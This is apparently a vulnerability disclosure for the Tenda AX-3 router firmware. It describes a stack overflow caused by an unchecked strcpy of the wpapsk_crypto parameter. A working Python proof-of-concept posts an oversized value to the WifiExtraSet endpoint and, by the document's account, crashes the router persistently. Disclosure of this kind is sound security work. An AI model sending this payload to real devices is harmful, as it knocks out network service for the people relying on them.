# Tenda Vulnerability

Vendor:Tenda

Product:AX-3

Version:v16.03.12.10_CN(https://www.tenda.com.cn/material/show/3238)

Vulnerability Type: Stack Overflow

Author:Shuhao Shen

Mail:shenshuhao@hust.edu.cn

Institution:Huazhong University of Science and Technology(HUST)




## Vulnerability cause

In the wlSetExternParameter function, the wpapsk_crypto parameter is propagated to the strcpy function via the v18 parameter without any length restriction on the wpapsk_crypto parameter. The buffer size of the target parameter wpapsk_cryptovalue is 16 bytes. By crafting a request that passes the wpapsk check, this can lead to a stack overflow, resulting in a Denial of Service (DoS) attack.

<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>




## PoC

In order to reproduce the vulnerability, the following steps can be followed:

1.Boot the firmware by qemu-system or other ways (real machine)

2.Attack with the following POC attacks


```
import requests

url = "http://192.168.20.12/goform/WifiExtraSet"

wpapsk_crypto = "A" * 5000

data = {
"wifi_chkHz": "1",
"wl_mode": "wisp",
"ssid": "test_ssid",         
"mac": "00:11:22:33:44:55",   
"handset": "0",              
"security": "wpapsk",       
"wpapsk_key": "12345678",    
"wpapsk_type": "wpa&wpa2",   
"wpapsk_crypto": wpapsk_crypto
}

r = requests.post(url, data=data)
print(r.text)
```


## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
<div  align="center"><img src="./images/3.png" style="zoom:80%;" /></div>